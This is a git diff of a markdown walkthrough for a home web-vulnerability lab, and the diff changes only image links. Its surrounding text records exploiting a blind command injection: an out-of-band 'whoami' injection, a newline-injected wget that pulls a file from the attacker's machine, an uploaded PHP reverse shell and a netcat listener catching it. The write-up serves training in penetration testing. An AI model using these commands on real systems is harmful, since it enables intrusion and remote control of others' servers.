@@ -2,30 +2,28 @@
 
 - In the provided tab where I can enter the URL, I will now proceed to further investigate and explore.
 
-![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/e8ba5d60-4dd4-4685-be8c-9e929e624408)
+![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/4325adcd-d5b0-42ae-95d4-b05a3990adb0)
 
 - Upon entering the website URL, the response received is "website ok."
 
-![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/5b166f42-ab4f-4b96-8266-5d7b176d38d6)
+![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/90f8e072-acf7-4142-95f2-9f23f1103625)
 
 - After attempting a simple payload, the response received remains the same, indicating "website ok" without any discernible changes.
 - When trying to navigate to a random page in the URL, the response received is "website not found."
 
-![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/ad7b494e-019e-4ce0-8db3-2837d813bf2d)
-![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/7aa181f0-64ca-47e0-a4eb-01343305537c)
+![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/fc0a5688-5b28-4a03-a17a-9e9dfe228eb9)
 
 - When attempting to execute a simple injection command and encountering a potential command filtering mechanism, it further reinforces the indication of a blind command injection vulnerability.
 - By utilizing the webhook.site URL and injecting a command, I received a response from the URL containing the username. This confirms the existence of an `Out-of-band` command injection vulnerability.
 - cmd: "<IP>?`whoami`"
 
-![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/f2afd58e-fb62-4261-8b81-8537f70dec24)
-![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/6df42ea6-f0f8-46b1-80b6-6713be6cc2f5)
+![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/a729dabd-f96d-4fda-9a79-011505975362)
 
 - I attempted to make a new request using the newline character. The purpose of this request was to retrieve a file from my Linux machine.
 - I set up a Python server on my machine and injected the command into the URL.
 - cmd: `https://<RHOST> /n wget http://<LHOST>:8080/test`
 
-![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/1f237314-654c-4227-b192-6ef5822161e8)
+![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/fdcbbf2a-6493-4b2c-8f30-acb88ad53955)
 
 - I observe that the request has been made successfully, indicating that the command injection was successful.
 
@@ -44,8 +42,7 @@ xxx.xxx.xx.4 - - [16/Jul/2023 05:00:04] "HEAD /phprevshell.php HTTP/1.1" 200 -
 ```
 - On navigation from the browser to `IP/phprevshell.php` I got the revshell back to my system.
 
-![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/6177876c-20b1-4ba2-89f7-eb85f14add61)
-
+![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/c3d57cf5-7c44-46e7-8838-ec96fcca02d2)
 
 ```bash
 └─$ rlwrap nc -nvlp 1234 
